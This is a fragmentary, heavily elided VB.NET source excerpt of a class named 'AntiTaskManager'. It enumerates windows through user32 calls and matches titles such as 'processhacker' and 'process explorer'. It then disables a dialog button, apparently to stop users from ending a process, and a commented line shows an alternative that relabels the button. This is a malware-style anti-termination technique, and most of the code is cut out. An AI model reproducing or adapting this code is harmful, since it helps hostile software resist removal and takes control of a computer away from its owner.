...
Public Class AntiTaskManager
    ...
    Private Declare Auto Function GetWindowText Lib "user32.dll" (ByVal hwnd As Int32,
    ...
    Private Declare Function EnumChildWindows Lib "user32" (ByVal hWnd As IntPtr,
            ...
            If id > 0 Then
                ...
                = "processhacker" Or Title.ToLower = "process explorer" Then
                    ...
                    If button.Count = 2 And (statics = 2 Or statics = 1) Then
                        EnableWindow(button(0), False) 'Just disbale the button
                        'SendMessage(button(0), &HC, 0, "Error") 'Disable buttn change text
                    End If
                End If
            End If
        End While
